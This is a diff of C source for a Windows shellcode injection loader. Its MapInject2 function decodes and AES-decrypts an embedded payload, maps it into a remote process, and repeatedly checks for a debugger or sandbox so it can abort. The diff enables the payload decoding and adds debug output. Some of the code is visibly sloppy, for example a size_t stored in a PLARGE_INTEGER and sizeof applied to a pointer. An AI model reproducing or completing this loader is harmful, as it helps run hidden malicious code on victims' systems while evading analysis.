@@ -499,7 +499,7 @@ BOOL MapInject(IN HANDLE  hProcess  , IN HANDLE hThread ,OPTIONAL OUT  PVOID* pI
     }
     //size_t shellSize = 80144;
     //size_t encodedWordCount = sizeof(encoded_words) / sizeof(encoded_words[0]);
-    //unsigned char* EncryptedShellcode = NULL;
+    unsigned char* EncryptedShellcode = NULL;
     size_t sBuffSize = sizeof(EncryptedShellcode);
     //DecodeWordsToShellcode(encoded_words, encodedWordCount , &EncryptedShellcode, &sBuffSize);
 //    decode_shellcode(shellcode);
@@ -740,14 +740,19 @@ BOOL MapInject2(IN HANDLE  hProcess, IN HANDLE hThread, OPTIONAL OUT  PVOID* pIn
     if (!hProcess) {
         return FALSE;
     }
-    //size_t shellSize = 80144;
-    //size_t encodedWordCount = sizeof(encoded_words) / sizeof(encoded_words[0]);
-    //unsigned char* EncryptedShellcode = NULL;
-    size_t sBuffSize = sizeof(EncryptedShellcode);
-    //DecodeWordsToShellcode(encoded_words, encodedWordCount , &EncryptedShellcode, &sBuffSize);
+    size_t shellSize = 80144;
+    size_t encodedWordCount = sizeof(encoded_words) / sizeof(encoded_words[0]);
+    unsigned char* EncryptedShellcode = NULL;
+    size_t sBuffSize = 0;
+    DecodeWordsToShellcode(encoded_words, encodedWordCount , &EncryptedShellcode, &sBuffSize);
+
 //    decode_shellcode(shellcode);
-  
-    SIZE_T buff_size = sizeof(EncryptedShellcode);
+    myprintf("first 10 bytes : \n ");
+    for (int i = 0; i < 10; i++) {
+        myprintf("0x%X , " , EncryptedShellcode[i]);
+    }
+
+    SIZE_T buff_size = encodedWordCount;
     if (ChekDebug()) {
         //myprintf("No sandbox detected, continuing execution...\n");
         return FALSE;
@@ -760,7 +765,7 @@ BOOL MapInject2(IN HANDLE  hProcess, IN HANDLE hThread, OPTIONAL OUT  PVOID* pIn
     }
 
 
-    PLARGE_INTEGER sSectionSize = sizeof(EncryptedShellcode);
+    PLARGE_INTEGER sSectionSize = encodedWordCount;
     if (ChekDebug()) {
         //myprintf("No sandbox detected, continuing execution...\n");
         return FALSE;
@@ -799,7 +804,7 @@ BOOL MapInject2(IN HANDLE  hProcess, IN HANDLE hThread, OPTIONAL OUT  PVOID* pIn
     }
     myprintf("Our Remote View : 0x%p \n", pRemoteView);
 
-
+    myprintf("sBuffSize : 0x%d \n" , sBuffSize);
     if (ChekDebug()) {
         //myprintf("No sandbox detected, continuing execution...\n");
         return FALSE;
@@ -819,8 +824,11 @@ BOOL MapInject2(IN HANDLE  hProcess, IN HANDLE hThread, OPTIONAL OUT  PVOID* pIn
         myprintf("encoo is NULL \n");
         return FALSE;
     }
+    myprintf("encshellocde not null \n");
+
     if (!InstallAesDecryptionViaCtAes(EncryptedShellcode, sSectionSize, AESKey, AESIv, &pLocalAddress)) {
         //MessageBoxA(NULL, "InstallAesDecryptionViaCtAes Failed !", "Dummy_Bear", MB_OK);
+        myprintf("InstallAesDecryptionViaCtAes failed\n");
         return FALSE;
     }
 
